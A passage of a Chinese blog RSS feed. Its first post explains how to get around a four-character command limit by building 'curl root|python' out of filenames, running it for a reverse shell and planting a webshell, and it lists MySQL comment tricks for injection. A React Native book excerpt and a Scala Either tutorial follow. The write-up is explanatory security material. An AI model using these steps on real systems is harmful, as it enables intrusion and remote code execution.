&lt;p&gt;假设我们要生成&lt;strong&gt;ls -t &amp;gt;g&lt;/strong&gt;命令，它的逆序是&lt;strong&gt;g&amp;lt; t- sl&lt;/strong&gt;，按照ASCII值排序方式的话，&lt;strong&gt;t-&lt;/strong&gt;会在&lt;strong&gt;sl&lt;/strong&gt;后面，不满足需求。所以我们变通一下，生成命令&lt;strong&gt;ls -th &amp;gt;g&lt;/strong&gt;，逆序就是&lt;strong&gt;g&amp;gt; ht- sl&lt;/strong&gt;，正好满足顺序要求。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&amp;gt;g\&amp;gt;
&amp;gt;ht-
&amp;gt;&lt;span&gt;sl
&lt;/span&gt;&amp;gt;&lt;span&gt;dir&lt;/span&gt;
*&amp;gt;&lt;span&gt;v
&lt;/span&gt;&amp;gt;&lt;span&gt;rev
&lt;/span&gt;*v&amp;gt;&lt;span&gt;x
cat x&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180809212815530-543326449.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;03.续行符技巧拼接命令&lt;/h2&gt;
&lt;p&gt; Linux里面有个神奇的符号\(反斜杠)，可以进行命令的续行，比如下面这个例子，我创建了两个文件a和b，我们通过ls命令查看效果和续行效果是一样的。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
&amp;gt;&lt;span&gt;a
&lt;/span&gt;&amp;gt;&lt;span&gt;b
ls
l\
s&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180809213612998-1491702136.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这样，我们就可以构造一连串的拼接命令进行续行操作。再比如，我要构造命令&lt;strong&gt;curl root|python&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&amp;gt;&lt;span&gt;on
&lt;/span&gt;&amp;gt;&lt;span&gt;th\\
&lt;/span&gt;&amp;gt;&lt;span&gt;py\\
&lt;/span&gt;&amp;gt;\|&lt;span&gt;\\
&lt;/span&gt;&amp;gt;&lt;span&gt;ot\\
&lt;/span&gt;&amp;gt;&lt;span&gt;ro\\
&lt;/span&gt;&amp;gt;&lt;span&gt;\ \\
&lt;/span&gt;&amp;gt;&lt;span&gt;rl\\
&lt;/span&gt;&amp;gt;&lt;span&gt;cu\\
ls &lt;/span&gt;-t
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180809214623746-376050535.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里我们可能会有点疑问，&lt;strong&gt;&amp;gt;th\\&lt;/strong&gt;这里看着是5个字符，超过了4个的限制，实际上是因为shell环境需要输入\\产生\，但是php代码exec时，只需要输入\即可产生\，比如 &lt;strong&gt;exec(“&amp;gt;th\”)&lt;/strong&gt;即可。所以这里实际上是不超过4个字符的。&lt;/p&gt;
&lt;p&gt; 我们再执行&lt;strong&gt;ls -th&amp;gt;g&lt;/strong&gt;，把这些按照时间顺序导入到g文件里面，再查看一下g文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180809214913240-884830258.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后执行&lt;strong&gt;sh g&lt;/strong&gt;反弹shell即可，这里我就不演示给大家看了，大家可以自己在本机上进行尝试即可~~&lt;/p&gt;
&lt;p&gt;这里对如何在命令长度受限的情况下成功get到webshell做个小结：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;w长度最短的命令&lt;/li&gt;
&lt;li&gt;ls -t 以创建时间来列出当前目录下所有文件&lt;/li&gt;
&lt;li&gt;文件列表以[换行符]分割每个文件&lt;/li&gt;
&lt;li&gt;引入 `\` 转义ls时的换行&lt;/li&gt;
&lt;li&gt;换行不影响命令执行&lt;/li&gt;
&lt;li&gt;成功构造任意命令执行，写入Webshell&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;关于mysql部分还有一些注释技巧，我给大家列一下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;[#] 行内注释&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;[-- ] 行内注释，注意末尾的空格&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;[/*...*/] 段注释，可多行&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;[`] 某些情况下，可以作为注释&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;[;] 支持多句执行的情况下，可直接用分号闭合第一句SQL语句&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;具体的参考P牛的课件：&lt;a href=&quot;https://files.cnblogs.com/files/ECJTUACM-873284962/%E6%9D%A5%E8%87%AA%E5%B0%8F%E5%AF%86%E5%9C%88%E9%87%8C%E7%9A%84%E9%82%A3%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7.pdf&quot; target=&quot;_blank&quot;&gt;来自小密圈里的那些奇技淫巧&lt;/a&gt;&lt;/p&gt;

</description>
<pubDate>Thu, 09 Aug 2018 14:31:00 +0000</pubDate>
<dc:creator>Angel_Kitty</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/ECJTUACM-873284962/p/9452263.html</dc:identifier>
</item>
<item>
<title>《React Native 精解与实战》书籍连载「React 与 React Native 简介」 - Parry</title>
<link>http://www.cnblogs.com/parry/p/rn_book_intro_react_and_reactnative.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/parry/p/rn_book_intro_react_and_reactnative.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;http://7xqdjc.com1.z0.glb.clouddn.com/b_3f2f3f5e94fc9d492a63a436de553ac2.png&quot; alt=&quot;截图&quot;/&gt;&lt;/p&gt;
&lt;p&gt;此文是我的出版书籍&lt;a href=&quot;http://rn.parryqiu.com/&quot;&gt;《React Native 精解与实战》&lt;/a&gt;连载分享，此书由机械工业出版社出版，书中详解了 React Native 框架底层原理、React Native 组件布局、组件与 API 的介绍与代码实战，以及 React Native 与 iOS、Android 平台的混合开发底层原理讲解与代码实战演示，精选了大量实例代码，方便读者快速学习。&lt;/p&gt;
&lt;p&gt;书籍还配套了视频教程「80 节实战课精通 React Native 开发」，此视频课程建议配合书籍学习，书籍中原理性的东西讲解的比较清晰，而视频教程对于组件、API 等部分的代码实战开发讲解比较直观。&lt;/p&gt;
&lt;p&gt;书籍相关所有资料请访问：&lt;a href=&quot;http://rn.parryqiu.com/&quot;&gt;http://rn.parryqiu.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这一章节中我们将对 React 与 React Native 的基本概念进行介绍。从 React 产生的背景到 React 的框架详细介绍，同时也对 React 的底层实现原理进行了简单的介绍，然后过渡到对 React Native 的基本概念进行了介绍。&lt;/p&gt;
&lt;p&gt;这一章节你将对 React 与 React Native 框架的发展、框架之间的关系有一个基本的了解，具体的技术细节在后续的章节将有更加详细的讲解与实战。&lt;/p&gt;
&lt;h2 id=&quot;react-简介&quot;&gt;1.1 React 简介&lt;/h2&gt;
&lt;p&gt;React 框架是一个非常优雅、现代的前端开发框架，下面我们将对 React 框架产生的背景与 React 框架的发展历史进行介绍，并通过一个小的实例更加直观地了解 React 框架的结构以及核心特性，在此基础上对 React 框架优秀性能表现的原因从底层进行了剖析。&lt;/p&gt;
&lt;h3 id=&quot;react-产生的背景&quot;&gt;1.1.1 React 产生的背景&lt;/h3&gt;
&lt;p&gt;React 框架最早孵化于 Facebook 内部，Jordan Walke 是框架的创始人。作为内部使用的框架，在 2011 年的时候 React 框架被用于 Facebook 的新闻流 （newsfeed）以及 2012 年使用在了 Instagram 项目上。在 2013 年五月美国的 JSConf 大会上，React 框架项目被宣布了开源。&lt;/p&gt;
&lt;p&gt;图 1-1 为 GitHub 上 React 的开源项目截图，GitHub 地址为：https://github.com/facebook/react/。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xqdjc.com1.z0.glb.clouddn.com/b_712400556635b966f4fd0a28bee8f9c7.png&quot; alt=&quot;截图&quot;/&gt;&lt;br/&gt;&lt;em&gt;图 1-1 GitHub 上的 React 项目&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;React 框架产生的缘由是在当时的技术背景下，前端 MVC （Model-View-Controller） 框架性能不能满足 Facebook 项目的性能需求以及扩展需求，所以 Jordan Walke 索性就自己着手开始写 React 框架，这真是一种值得学习的精神。&lt;/p&gt;
&lt;p&gt;在 Facebook 内部极其复杂的项目中，当时面临的一个问题是，MVC 架构的项目当 Model 和 View 有数据流动时，可能会出现双向的数据流动，那么项目的调试以及维护将变得异常复杂。&lt;/p&gt;
&lt;h3 id=&quot;react-框架简介&quot;&gt;1.1.2 React 框架简介&lt;/h3&gt;
&lt;p&gt;React 官方也说自己不是一个 MVC 框架 （https://reactjs.org/blog/2013/06/05/why-react.html），或者说 React 只专注于 MVC 框架设计模式中的 View 层面的实现。&lt;br/&gt;为了大大减少传统前端直接操作 DOM 的昂贵花费，React 使用 Virtual DOM （虚拟 DOM）进行 DOM 的更新。&lt;/p&gt;
&lt;p&gt;图 1-2 为 React 框架的基本结构，此图清晰明了地描述出了 React 底层与前端浏览器的沟通机制。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xqdjc.com1.z0.glb.clouddn.com/b_55a8392275b2bfb51fb3622798960b0a.png&quot; alt=&quot;截图&quot;/&gt;&lt;br/&gt;&lt;em&gt;图 1-2 React 框架结构&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;React 的组件是用户界面的最小元素，与外界的所有交互都通过 state 和 props 进行传递。通过这样的组件封装设计，使用声明式的编程方式，使得 React 的逻辑足够简化，并可以通过模块化开发逐步构建出项目的整体 UI。&lt;/p&gt;
&lt;p&gt;React 框架中还有一个重要的概念是单向数据流，所有的数据流从父节点传递到子节点。假设父节点数据通过 props 传递到子节点，如果相对父节点（或者说相对顶层）传递的 props 值改变了，那么其所有的子节点（默认在没有使用 shouldComponentUpdate 进行优化的情况下）都会进行重新渲染，这样的设计使得组件足够扁平并且也便于维护。&lt;/p&gt;
&lt;p&gt;以下的示例代码演示了 React 框架基本组件定义以及单向数据流的传递。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;完整代码在本书配套源码的 01-01-02 文件夹。&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们在 index.js 文件中定义 React 项目的入口，render 函数中使用了子组件 BodyIndex，并通过 props 传递了两个参数，id 和 name，用于从父组件向子组件传递参数，这也是 React 框架中数据流的传递方式。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;1.  /** 
2.   * 章节: 01-01-02 
3.   * index.js 定义了 React 项目的入口 
4.   * FilePath: /01-01-02/index.js 
5.   * @Parry 
6.   */  
7.    
8.  var React = require('react');  
9.  var ReactDOM = require('react-dom');  
10. import BodyIndex from './components/bodyindex';  
11. class Index extends React.Component {  
12.   
13.     //生命周期函数 componentWillMount，组件即将加载  
14.     componentWillMount(){  
15.         console.log(&quot;Index - componentWillMount&quot;);  
16.     }  
17.   
18.     //生命周期函数 componentDidMount，组件加载完毕  
19.     componentDidMount(){  
20.         console.log(&quot;Index - componentDidMount&quot;);  
21.     }  
22.   
23.     //页面表现组件渲染  
24.     render() {  
25.         return (  
26.             &amp;lt;div&amp;gt;  
27.                 &amp;lt;BodyIndex id={1234567890} name={&quot;IndexPage&quot;}/&amp;gt;  
28.             &amp;lt;/div&amp;gt;  
29.         );  
30.     }  
31. }  
32.   
33. ReactDOM.render(&amp;lt;Index/&amp;gt;, document.getElementById('example'));  &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在子组件 BodyIndex 中，其自身定义了 state 值，并通过 setTimeout 函数在页面加载 5 秒后进行 state 值的修改。页面表现层代码部分演示了如何读取自身的 state 值以及读取父组件传递过来的 props 值。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;1.  /** 
2.   * 章节: 01-01-02 
3.   * bodyindex.js 定义了一个名为 BodyIndex 的子组件 
4.   * FilePath: /01-01-02/bodyindex.js 
5.   * @Parry 
6.   */  
7.    
8.  import React from 'react';  
9.  export default class BodyIndex extends React.Component {  
10.   constructor() {  
11.     super();  
12.     this.state = {  
13.       username: &quot;Parry&quot;  
14.     };  
15.   }  
16.   
17.   render() {  
18.     setTimeout(() =&amp;gt; {  
19.       //5秒后更改一下 state  
20.       this.setState({username: &quot;React&quot;});  
21.     }, 5000);  
22.   
23.     return (  
24.       &amp;lt;div&amp;gt;  
25.         
26.         &amp;lt;h1&amp;gt;子组件页面&amp;lt;/h1&amp;gt;  
27.   
28.         &amp;lt;h2&amp;gt;当前组件自身的 state&amp;lt;/h2&amp;gt;  
29.         &amp;lt;p&amp;gt;username: {this.state.username}&amp;lt;/p&amp;gt;  
30.   
31.         &amp;lt;h2&amp;gt;父组件传递过来的参数&amp;lt;/h2&amp;gt;  
32.         &amp;lt;p&amp;gt;id: {this.props.id}&amp;lt;/p&amp;gt;  
33.         &amp;lt;p&amp;gt;name: {this.props.name}&amp;lt;/p&amp;gt;  
34.   
35.       &amp;lt;/div&amp;gt;  
36.     )  
37.   }  
38. }  &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;项目的 package.json 文件配置以及使用的相关框架版本如下，具体的配置方法以及意义后续章节会有详细讲解。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;1.  {  
2.    &quot;name&quot;: &quot;01-01-02&quot;,  
3.    &quot;version&quot;: &quot;1.0.0&quot;,  
4.    &quot;description&quot;: &quot;&quot;,  
5.    &quot;main&quot;: &quot;index.js&quot;,  
6.    &quot;scripts&quot;: {  
7.      &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;amp;&amp;amp; exit 1&quot;  
8.    },  
9.    &quot;author&quot;: &quot;&quot;,  
10.   &quot;license&quot;: &quot;ISC&quot;,  
11.   &quot;dependencies&quot;: {  
12.     &quot;babel-preset-es2015&quot;: &quot;^6.14.0&quot;,  
13.     &quot;babel-preset-react&quot;: &quot;^6.11.1&quot;,  
14.     &quot;babelify&quot;: &quot;^7.3.0&quot;,  
15.     &quot;react&quot;: &quot;^15.3.2&quot;,  
16.     &quot;react-dom&quot;: &quot;^15.3.2&quot;,  
17.     &quot;webpack&quot;: &quot;^1.13.2&quot;,  
18.     &quot;webpack-dev-server&quot;: &quot;^1.16.1&quot;  
19.   }  
20. } &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在命令行执行 webpack-dev-server 命令后，浏览器中的运行效果如图 1-3 所示，并且在 5 秒后子组件的 state 定义的 username 值由 Parry 变成了 React。&lt;/p&gt;
&lt;p&gt;你可以直接在本地编写代码运行测试或直接下载本书配套源码直接运行，运行后，注意此 state 页面值更新的部分，整个页面没有进行任何的重新刷新加载，而只是进行了局部的更新，背后的原理在下面的一小节会展开讲解。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xqdjc.com1.z0.glb.clouddn.com/b_5d6f7460aea62dd66344fd4379269d0c.png&quot; alt=&quot;截图&quot;/&gt;&lt;br/&gt;&lt;em&gt;图 1-3 代码在浏览器中的执行结果&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&quot;react-底层原理&quot;&gt;1.1.3 React 底层原理&lt;/h3&gt;
&lt;p&gt;React 框架底层的核心为 Virtual DOM，也就是虚拟 DOM。此小节将介绍这个最主要的底层特性，只有在你理解了 React 框架底层的本质，才能更好地帮助你理解 React 框架的前端表现，并为后续章节讨论 React Native 框架的性能优化进行一定的知识储备。&lt;/p&gt;
&lt;p&gt;传统的 HTML 页面更新页面元素，或者说需要更新页面，都是将整个页面重新加载实现重绘，执行这样的操作不管是对于服务器还是在用户体验上，“花费”都是非常昂贵的。后来，开始有了 AJAX（Asynchronous JavaScript And XML）这样的局部更新技术，实现了页面局部组件的异步更新，不过 AJAX 在代码的编写、维护、性能以及更新粒度的控制上还是没有达到一个完美的状态。&lt;/p&gt;
&lt;p&gt;文档对象模型（Document Object Model，简称 DOM），是 W3C 组织推荐的处理可扩展标志语言的标准编程接口。在 HTML 网页上，组织页面（或文档）的对象元素被组织在一个树形结构中，用来表示文档中对象的标准模型就称为 DOM。&lt;/p&gt;
&lt;p&gt;React 通过在框架底层设计了一个虚拟 DOM，此虚拟 DOM 与页面上的真实 DOM 进行映射，当业务逻辑修改了 React 组件中的 state 部分，如上例中，子组件的 state 值，username 由 Parry 修改成了 React，React 框架底层的 diff 算法会与页面 DOM 比较计算，哪些部分更改了，通过比较虚拟 DOM 与真实 DOM 的差异，最终只更新真实 DOM 与虚拟 DOM 差异的部分。此计算过程是在内存中进行的，并最终只更新差异的部分，所以 React 在前端中的高性能表现正是来自于此底层的设计。&lt;/p&gt;
&lt;p&gt;图 1-4 展示了 React 中的虚拟 DOM 与页面真实 DOM 之间的关系，之间的差异通过 React 框架底层的 diff 算法进行计算。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xqdjc.com1.z0.glb.clouddn.com/b_91b82e4032da64da5e02a586991c1284.png&quot; alt=&quot;截图&quot;/&gt;&lt;br/&gt;&lt;em&gt;图 1-4 React 虚拟 DOM 与页面真实 DOM&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;如果需要更加深入一步了解 React 在源码级别的实现原理，可以参考我博客里从 React 的源码角度对 React 底层批量更新 state 策略的分析文章。&lt;/p&gt;
&lt;p&gt;o 深入理解 React JS 中的 setState&lt;br/&gt;http://blog.parryqiu.com/2017/12/19/react_set_state_asynchronously/&lt;br/&gt;o 从源码的角度再看 React JS 中的 setState&lt;br/&gt;http://blog.parryqiu.com/2017/12/29/react-state-in-sourcecode/&lt;br/&gt;o 从源码的角度看 React JS 中批量更新 State 的策略（上）&lt;br/&gt;http://blog.parryqiu.com/2018/01/04/2018-01-04/&lt;br/&gt;o 从源码的角度看 React JS 中批量更新 State 的策略（下）&lt;br/&gt;http://blog.parryqiu.com/2018/01/08/2018-01-08/&lt;/p&gt;
&lt;h3 id=&quot;react-优势&quot;&gt;1.1.4 React 优势&lt;/h3&gt;
&lt;p&gt;通过上面对 React 框架的简介、代码演示以及底层原理的解析得知，React 最大的优势在于更新页面 DOM 时，对比于之前的前端更新方案，效率大大提高。其实 React 并不会在 state 更改的第一时间就去执行 diff 并立即更新页面 DOM，而是将多次操作汇聚成一次批量操作，这样再次大大提升了页面更新重绘的效率，这部分在分享的源码分析文章中有详细地讲解，感兴趣的朋友可以直接参考我博客中的对 React 框架的深入剖析。&lt;/p&gt;
&lt;p&gt;使用 React 框架开发，我们不会通过 JavaScript 代码直接操作前端真实 DOM，而是完全通过 state 以及 props 的变更引起页面 DOM 的变更，这比 jQuery 等框架那样进行大量的 DOM 查找与操作来得简单、高效的多。&lt;/p&gt;
&lt;p&gt;React 框架在开源生态下，已经有大量的相关开源框架与组件可供使用，非常适合项目的快速开发。&lt;br/&gt;以上这些 React 框架的优势，同时也会转化成 React Native 框架的优势，所以这些也是学习 React Native 框架的必备背景知识，希望大家深入体会与实战。&lt;/p&gt;
&lt;h2 id=&quot;react-native-简介&quot;&gt;1.2 React Native 简介&lt;/h2&gt;
&lt;p&gt;在了解到了 React 框架的基本概念、发展历史以及底层基本原理后，我们再来学习 React Native 的基本概念将变得更加容易。&lt;/p&gt;
&lt;p&gt;下面我们将介绍 React 与 React Native 的关系，在对 React Native 框架有了基本了解后，我们将会深深地体会到为什么选择 React Native 框架进行移动 App 开发是一个最佳的选择。&lt;/p&gt;
&lt;h3 id=&quot;react-与-react-native-关系&quot;&gt;1.2.1 React 与 React Native 关系&lt;/h3&gt;
&lt;p&gt;Facebook 曾致力于使用 HTML 5 进行移动端的开发，最终发现与原生的 App 相比，体验上还是有非常大的差距，并且这种差距越来越大，特别是性能方面的差距。&lt;/p&gt;
&lt;p&gt;最终，Facebook 放弃了 HTML 5 的技术方向，结合之前章节介绍的 React 框架的发展历史，2015 年 3 月，Facebook 正式发布了 React Native 框架，此框架专注于移动端 App 的开发。&lt;/p&gt;
&lt;p&gt;在最初发布的版本中，我们只可以使用 React Native 框架开发 iOS 平台的 App，在 2015 年 9 月，Facebook 发布了支持 Android 平台的 React Native 框架。至此，React Native 框架真正实现了跨平台的移动 App 开发，此消息简直就是移动开发人员的福音。&lt;/p&gt;
&lt;p&gt;图 1-5 为 GitHub 上 React Native 的开源项目，GitHub 地址为：https://github.com/facebook/react-native/。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xqdjc.com1.z0.glb.clouddn.com/b_75f01294da56b973e3efd3d293b9ca78.png&quot; alt=&quot;截图&quot;/&gt;&lt;br/&gt;&lt;em&gt;图 1-5 GitHub 上 React Native 开源项目&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&quot;react-native-简介-1&quot;&gt;1.2.2 React Native 简介&lt;/h3&gt;
&lt;p&gt;React Native 框架在 React 框架的基础上，底层通过对 iOS 平台与 Android 平台原生代码的封装与调用，结合前台的 JavaScript 代码，这样我们就可以通过 JavaScript 代码编写出调用 iOS 平台与 Android 平台原生代码的 App，调用原生代码编写的 App 的性能远远优于使用 HTML 5 开发的 App 性能，因为 HTML 5 开发的 App 只是在 HTML 5 外部包裹上一个程序外壳后在移动平台上运行，在性能与可以实现的功能上都不能达到 React Native 框架的水准。&lt;/p&gt;
&lt;p&gt;React Native 框架提供了原生组件与底层 API 供开发者使用，这些自带的组件与 API 已足够满足移动端 App 的开发需求，后续章节会详细展开讲解这些组件与 API 的概念与使用实战演示。&lt;/p&gt;
&lt;p&gt;React Native 框架还提供了与 iOS 平台、Android 平台混合开发的接口，让开发者可以在 React Native 中调用 iOS 平台与 Android 平台中任意的原生 API 与代码，让可以在原生平台实现的任何功能都可以在 React Native 框架中得以实现，后续章节同样会详细展开讲解并进行实战开发。&lt;/p&gt;
&lt;p&gt;在使用 React Native 框架开发移动平台 App 的过程中，我们可以直接使用 CSS 进行页面元素的布局，这是 iOS 与 Android 原生移动平台开发者简直不可想象的事情。&lt;/p&gt;
&lt;p&gt;开发人员在具备了 React 框架基础知识后，可以更加快速地进行 React Native 框架的学习与开发。图 1-6 为 React Native 官网截图，代码展示了我们只需要使用类似 HTML 5（JSX）的代码就可以进行跨平台的移动 App 开发。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xqdjc.com1.z0.glb.clouddn.com/b_f3e36380b66049c801abb58945428c39.png&quot; alt=&quot;截图&quot;/&gt;&lt;br/&gt;&lt;em&gt;图 1-6 React Native 演示代码&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&quot;react-native-优势&quot;&gt;1.2.3 React Native 优势&lt;/h3&gt;
&lt;p&gt;底层采用 React 框架，减少了我们的学习与开发成本，React Native 框架可以让你真正跨越移动开发的鸿沟，不需要分开学习 iOS 平台与 Android 平台的特定语法、页面布局以及各平台的特别处理技巧，使用一套 React Native 代码的部署就可以覆盖多个移动平台。&lt;/p&gt;
&lt;p&gt;React Native 性能优化的已足够好，完全可以避开之前使用 HTML 5 开发移动 App 的性能障碍。&lt;br/&gt;React Native 框架的 JavaScript Core 底层，可以让 App 轻松实现更新操作，基本上更新一下 JavaScript 文件，整个 App 就完成了更新，非常适合用来开发 App 的热更新。热更新的功能在后续章节也会详细讲解与实战开发。&lt;/p&gt;
&lt;p&gt;React Native 框架同时也使得 App 的开发调试变得异常简单，不需要像之前在多个平台、多个语言、多个工具之间跳来跳去，React Native 开发的 App 在模拟器或真机中，只需要像刷新浏览器一样就可以即时查看到代码修改后的效果，并且还可以在 Chrome 浏览器中查看控制台输出、加断点、单步调试等等，整个过程完全就是 JavaScript 开发调试的体验，整个开发的体验非常畅快。&lt;/p&gt;
&lt;p&gt;图 1-7 为使用 React Native 框架开发时，在 iOS 系统下的开发调试选项截图，非常的强大、方便。Android 平台提供了同样的调试选项。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xqdjc.com1.z0.glb.clouddn.com/b_897c45a14d0c77e6d27cb02b10836f34.png&quot; alt=&quot;截图&quot;/&gt;&lt;br/&gt;&lt;em&gt;图 1-7 React Native 开发调试&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&quot;react-native-前置知识点&quot;&gt;1.3 React Native 前置知识点&lt;/h2&gt;
&lt;p&gt;在正式开始学习 React Native 框架前，我们梳理一下需要具备的一些基本知识，因为 React Native 毕竟是进行多平台的移动 App 开发，涉及到的知识点比较多，而且底层的 React 框架有别于目前既有的一些前端框架知识，供你在学习前进行自我梳理与学习准备。&lt;/p&gt;
&lt;p&gt;o 掌握 HTML 5 的基本知识；&lt;br/&gt;o 掌握 JavaScript 的基础知识，如果有 React 的基础知识学习起来会更加地轻松；&lt;br/&gt;o 掌握 CSS 布局的基本知识，在 React Native 中会使用 CSS 直接进行页面元素的布局与样式控制；&lt;br/&gt;o 接触过移动端的开发更好，项目的后期会涉及到两个平台的 App 打包、部署与上架，不过这些知识点后续章节都会进行讲解；&lt;br/&gt;o Node.js 以及 npm 包管理的知识，这部分后续章节同样会有详细地讲解。&lt;/p&gt;
</description>
<pubDate>Thu, 09 Aug 2018 14:30:00 +0000</pubDate>
<dc:creator>Parry</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/parry/p/rn_book_intro_react_and_reactnative.html</dc:identifier>
</item>
<item>
<title>scala中Either的一种使用场景 - PerKins.Zhu</title>
<link>http://www.cnblogs.com/PerkinsZhu/p/9450593.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/PerkinsZhu/p/9450593.html</guid>
<description>&lt;p&gt;用scala有一年多了，对于scala中的Option和Try使用的较为频繁，对其应用场景相对熟悉一些。而对于Either，仔细回想一下却发现几乎(完全)没有使用过，其实并不是没有遇到过Either的使用场景，只是遇到的时候不知道能够使用Either来解决此问题。&lt;br/&gt;昨天在网上偶然看到一篇介绍Either的文章，发现有一种场景可以使用Either来解决，具体是这样的：&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;&lt;span&gt;web系统中，Controller层调用service层方法，根据邮箱查询注册的用户User，如果未取到User，则需要知道是什么原因导致的。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;定义一个方法，根据登录邮箱查询User对象，方法签名如： &lt;strong&gt;&lt;span&gt;def getUserByEmail(email:String):User&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;注意方法的返回值类型，这里返回的是User对象。在运行时会发生如下三种情况：&lt;/p&gt;
&lt;p&gt;　　1、正常返回null&lt;/p&gt;
&lt;p&gt;　　2、正常返回User&lt;/p&gt;
&lt;p&gt;　　3、发生异常抛出Exception。&lt;/p&gt;
&lt;p&gt;对于情况1，调用处如果想知道是为什么返回了null，是因为email的格式错误？还是因为该email没有注册的用户？ 该种方法签名是没办法把失败原因返回给调用处的 。&lt;br/&gt;那么我们考虑能否把返回结果类型User修改为Try[User],即：&lt;strong&gt;&lt;span&gt;def getUserByEmail(email:String):Try[User]&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;　　对于刚才的情况1，如果是因为email格式不对，我们在方法体内可以封装一个Failure(RuntimeException(&quot;邮箱格式错误&quot;)）返回给调用处。而如果是该邮箱未注册，未查询到该用户，如果再封装一个Exception就不合适了。因为查不到用户属于正常的逻辑，不属于异常范畴，这种方式是不可取的。&lt;br/&gt;那么我们再考虑把返回值类型Try[User]修改为Option[User],即:&lt;strong&gt;&lt;span&gt;def getUserByEmail(email:String):Option[User]&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;　　这样，只是把把返回结果null修改为None,并未达到我们想要的目的&lt;br/&gt;这时，我们就可以考虑把返回值类型修改为Either[String,User],即:&lt;strong&gt;&lt;span&gt;def getUserByEmail(email:String):Either[String,User]&lt;/span&gt;&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;　　如果查询到User,那么返回一个Right(user)即可，如果邮箱格式错误，则返回一个Left(&quot;邮箱格式错误&quot;)，如果该邮箱未进行注册，则返回Left(&quot;该邮箱未进行注册&quot;);如果运行中发生Exception，可以直接抛出，也可以封装为Left(&quot;发生XXX异常&quot;)返回给调用处。&lt;br/&gt;除了通过Either来返回失败信息，我们也可以使用Tuple2[String,User]类型来实现想要的结果，在失败的时候返回Tuple2(&quot;失败原因描述&quot;,null),只是相对于Either来说，不是那么便捷。&lt;/p&gt;
&lt;p&gt; 使用方式可见如下伪代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt; @Test
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;   def testEither(): Unit =&lt;span&gt; {
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;     getUserByEmail(&quot;xxx@sina.com&quot;&lt;span&gt;) match {
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;       &lt;span&gt;case&lt;/span&gt; Right(user) =&amp;gt; ???
